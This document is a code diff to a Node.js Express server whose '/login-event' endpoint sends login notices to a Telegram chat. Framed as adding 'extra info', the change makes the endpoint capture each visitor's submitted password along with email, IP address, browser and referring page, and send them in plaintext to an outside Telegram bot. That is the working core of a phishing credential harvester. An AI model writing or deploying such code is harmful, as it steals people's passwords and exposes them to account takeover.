@@ -5,7 +5,7 @@ import fetch from "node-fetch";
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Telegram credentials will come from Render environment variables
+// Telegram credentials from Render
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -18,13 +18,25 @@ app.get("/", (req, res) => {
 
 app.post("/login-event", async (req, res) => {
   try {
-    const { email } = req.body;
+    const { email, password } = req.body;
+
+    // Extra info
+    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+    const userAgent = req.headers["user-agent"];
+    const time = new Date().toLocaleString();
+    const referer = req.headers["referer"];
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       return res.status(500).json({ error: "Telegram config missing" });
     }
 
-    const text = `Login attempt detected for email: ${email}`;
+    const text = `Login attempt detected:
+Email: ${email}
+Password: ${password}
+IP: ${ip}
+Browser: ${userAgent}
+Time: ${time}
+Page: ${referer}`;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const response = await fetch(url, {
